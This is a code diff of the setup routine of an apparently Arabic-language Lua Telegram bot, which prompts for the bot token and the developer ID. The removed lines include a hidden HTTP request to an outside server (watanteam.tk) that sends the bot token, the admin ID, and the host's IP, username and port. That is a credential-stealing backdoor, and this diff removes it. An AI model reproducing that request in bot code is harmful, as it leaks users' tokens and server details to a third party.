@@ -26,42 +26,33 @@ file:write(serialized)
 file:close()  
 end  
 if not database:get(id_server..":token") then
-io.write('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\naٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ\n\27')
+io.write('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27')
 local token = io.read()
 if token ~= '' then
 local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
 if res ~= 200 then
-print('\27[0;31mٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ\n التوكن غير صحيح تاكد منه ثم ارسله')
+print('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n التوكن غير صحيح تاكد منه ثم ارسله')
 else
-io.write('\27[0;31m تم حفظ التوكن بنجاح \naٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ\n27[0;39;49m')
+io.write('\27[0;31m تم حفظ التوكن بنجاح \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m')
+local json = JSON.decode(url)
+database:set(id_server..":token_username","@"..json.result.username)
 database:set(id_server..":token",token)
 end 
 else
-print('\27[0;35mٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
+print('\27[0;35m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
 end 
-os.execute('luaWaTaN.lua')
+os.execute('lua WaTaN.lua')
 end
-if not database:get(id_server..":SUDO:ID") then
-io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\naٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ\n\27[0;33;49m')
-local SUDOID = io.read():gsub(' ','') 
-if tostring(SUDOID):match('%d+') then
-data,res = https.request("http://abbas.watanteam.tk/WaTaN/index.php?bn=DRAGON&id="..SUDOID)
-if res == 200 then
-getIs = json:decode(data)
-if getIs.Info.info == 'Is_Spam' then
-io.write('\n\27[1;31mانت محظور من السورس\n\27[0;39;49m')
-os.execute('luaWaTaN.lua')
-end
-if getIs.Info.info == 'Ok' then
-io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \naٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ\n27[0;39;49m')
-database:set(id_server..":SUDO:ID",SUDOID)
-end 
-local t = json:decode(https.request('http://abbas.watanteam.tk/WaTaN/index.php?n=DRAGON&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
-else
-io.write('\27[0;31mٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
+if not database:get(id_server..":SUDO:ID") then 
+io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27[0;33;49m') 
+local SUDOID = io.read() 
+if SUDOID ~= '' then 
+io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m') 
+database:set(id_server..":SUDO:ID",SUDOID) 
+else 
+print('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره') 
 end  
-os.execute('luaWaTaN.lua')
-end 
+os.execute('lua WaTaN.lua') 
 end
 if not database:get(id_server..":SUDO:USERNAME") then
 io.write('\27[1;31m ↓ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
@@ -72,7 +63,7 @@ database:set(id_server..":SUDO:USERNAME",'@'..SUDOUSERNAME)
 else
 print('\n\27[1;34m لم يتم حفظ معرف المطور :')
 end 
-os.execute('luaWaTaN.lua')
+os.execute('lua WaTaN.lua')
 end
 local create_config_auto = function()
 config = {
